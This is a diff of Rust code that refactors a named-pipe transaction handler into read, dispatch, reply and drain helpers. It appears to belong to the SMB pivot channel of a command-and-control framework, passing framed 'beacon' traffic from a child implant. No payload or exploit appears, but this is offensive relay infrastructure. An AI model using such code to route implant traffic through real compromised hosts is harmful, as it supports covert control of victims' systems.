@@ -172,6 +172,19 @@ pub fn spawn(state: Arc<AppState>, pipe_name: String) {
 /// One pipe transaction: read `[4B LE len][frame]`, run the beacon funnel,
 /// write `[4B LE len][reply]`.
 fn serve_transaction(state: &Arc<AppState>, pipe: *mut std::ffi::c_void) -> std::io::Result<()> {
+    let frame = serve_transaction_read_request(pipe)?;
+    let reply = match serve_transaction_dispatch(state, &frame) {
+        Some(r) => r,
+        None => return Ok(()),
+    };
+    serve_transaction_seal_reply(pipe, &reply)?;
+    serve_transaction_drain_wait(pipe)?;
+    Ok(())
+}
+
+/// Read one length-prefixed request frame: `[4B LE len][frame]`, validating
+/// the length ceiling.
+fn serve_transaction_read_request(pipe: *mut std::ffi::c_void) -> std::io::Result<Vec<u8>> {
     // Read the length prefix with a deadline.
     let mut len_buf = [0u8; 4];
     read_exact_bounded(pipe, &mut len_buf)?;
@@ -185,14 +198,19 @@ fn serve_transaction(state: &Arc<AppState>, pipe: *mut std::ffi::c_void) -> std:
 
     let mut frame = vec![0u8; frame_len];
     read_exact_bounded(pipe, &mut frame)?;
+    Ok(frame)
+}
 
+/// Run the channel-agnostic beacon funnel (parse + handle) and return the
+/// reply; `None` when the funnel says "try again" (no reply written).
+fn serve_transaction_dispatch(state: &Arc<AppState>, frame: &[u8]) -> Option<Vec<u8>> {
     // Same channel-agnostic funnel as /beacon. The child retries on failure —
     // no reply means "try again".
-    let raw = match nyx_protocol::parse_frame(&frame) {
+    let raw = match nyx_protocol::parse_frame(frame) {
         Ok(r) => r,
         Err(e) => {
             tracing::debug!(target: "nyx::pivot", error = %e, "smb pivot frame parse failed");
-            return Ok(());
+            return None;
         }
     };
     // Peer address is unknown over a named pipe — use a placeholder (the
@@ -202,25 +220,31 @@ fn serve_transaction(state: &Arc<AppState>, pipe: *mut std::ffi::c_void) -> std:
         Ok(r) => r,
         Err(e) => {
             tracing::warn!(target: "nyx::pivot", error = %e, "smb pivot frame handling failed");
-            return Ok(());
+            return None;
         }
     };
     if reply.len() > MAX_FRAME {
         tracing::warn!(target: "nyx::pivot", bytes = reply.len(), "smb pivot reply exceeds cap; dropped");
-        return Ok(());
+        return None;
     }
+    Some(reply)
+}
 
+/// Prefix the reply with its 4-byte LE length and write it back.
+fn serve_transaction_seal_reply(pipe: *mut std::ffi::c_void, reply: &[u8]) -> std::io::Result<()> {
     let mut out = Vec::with_capacity(4 + reply.len());
     out.extend_from_slice(&(reply.len() as u32).to_le_bytes());
-    out.extend_from_slice(&reply);
-    write_all_bounded(pipe, &out)?;
+    out.extend_from_slice(reply);
+    write_all_bounded(pipe, &out)
+}
 
-    // The child reads the reply BEFORE closing its handle. `DisconnectNamedPipe`
-    // discards any unread data still in the pipe buffer, so re-arming
-    // immediately after the write would race the child's read and drop the
-    // reply tail (child sees ERROR_PIPE_NOT_CONNECTED mid-reply — reproduced
-    // on wine, latent on real Windows). Wait until the child has consumed the
-    // reply (bounded like the I/O phases) before the loop re-arms.
+/// The child reads the reply BEFORE closing its handle. `DisconnectNamedPipe`
+/// discards any unread data still in the pipe buffer, so re-arming
+/// immediately after the write would race the child's read and drop the
+/// reply tail (child sees ERROR_PIPE_NOT_CONNECTED mid-reply — reproduced
+/// on wine, latent on real Windows). Wait until the child has consumed the
+/// reply (bounded like the I/O phases) before the loop re-arms.
+fn serve_transaction_drain_wait(pipe: *mut std::ffi::c_void) -> std::io::Result<()> {
     let flush_deadline = std::time::Instant::now() + IO_TIMEOUT;
     loop {
         let mut avail: u32 = 0;
